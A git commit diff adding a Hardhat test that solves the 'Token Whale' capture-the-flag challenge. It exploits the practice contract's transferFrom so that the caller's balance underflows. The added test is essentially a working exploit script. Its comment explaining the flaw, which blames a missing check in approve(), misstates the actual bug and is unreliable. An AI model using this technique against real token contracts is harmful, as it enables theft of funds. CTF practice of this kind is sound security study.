d7f0d076e225ece9e6ee33e3ac8067c34ac65d60
Thomas Hepner <hepner.thomas@gmail.com>
2023-05-10 09:40:17 -0700

    feat: add Token Whale solution.

--- test/11-TokenWhale.test.ts
+++ test/11-TokenWhale.test.ts
@@ -5,25 +5,40 @@ import { ethers } from 'hardhat';
 
 describe('TokenWhaleChallenge', () => {
   let target: Contract;
-  let attacker: SignerWithAddress;
-  let deployer: SignerWithAddress;
+  let user1: SignerWithAddress;
+  let user2: SignerWithAddress;
+  let user3: SignerWithAddress;
 
   before(async () => {
-    [attacker, deployer] = await ethers.getSigners();
+    [user1, user2, user3] = await ethers.getSigners();
 
     target = await (
-      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
-    ).deploy(attacker.address);
+      await ethers.getContractFactory('TokenWhaleChallenge', user1)
+    ).deploy(user1.address);
 
     await target.deployed();
 
-    target = target.connect(attacker);
+
   });
 
+
+
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+
+    /* key to this challenge is that there is no require() statement in the approve() function that requires the approver to be the spender. this allows user2 to approve spending user1's tokens!
+    */
+
+    // connect with user2 address instead of user1 address for approval
+    target = target.connect(user2);
+    await target.approve(user1.address, 1000);
+
+    // connect with user1 address for transfer and transferFrom
+    target = target.connect(user1);
+    await target.transfer(user2.address, 501);
+
+    /* now user1 can exploit the transferFrom function by setting the from value to be different from the msg.sender value
+    */
+    await target.transferFrom(user2.address, user3.address, 500);
 
     expect(await target.isComplete()).to.equal(true);
   });
